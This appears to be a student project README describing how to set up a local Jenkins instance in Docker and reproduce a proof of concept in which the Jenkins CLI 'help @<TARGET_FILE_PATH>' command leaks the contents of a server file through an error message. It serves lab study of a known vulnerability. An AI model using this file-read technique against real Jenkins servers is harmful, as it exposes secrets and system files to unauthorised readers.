# CVE2_Jenkins_RCE
 Repo for CVE S2 Team 1 -- working on a Jenkins exploit

# Setting Up Jenkins
- Run "docker-compose build && docker-compose up -d"
- Navigate to http://localhost:8080, you will be prompted for an admin password
- Open a shell in the jenkins docker container (NOT THE POSTGRES ONE)
    - "docker exec -it <container_id> bash"
    - cd to directory listeed on the Jenkins page, acquire the password
- Set up a basic admin account (remember the password) and install default plugins 
-Configure anonymous users with basic permissions by going to Manage Jenkins > Security 
	- Set authorization type to "Matrix-based"
	- Allow anonymous users to read "Overall" and "Job"


#  Recreating the PoC
- Place a dummy file in the Jenkins system by opening a shell in the docker container (save the root path)
- Downloaded CLI client using "curl -O http://localhost:8080/jnlpJars/jenkins-cli.jar"  
- Execute "java -jar jenkins-cli.jar -s http://localhost:8080/ help @<TARGET_FILE_PATH>"
- If successful, you should get an error message "ERROR: No such command" followed by the file content


	
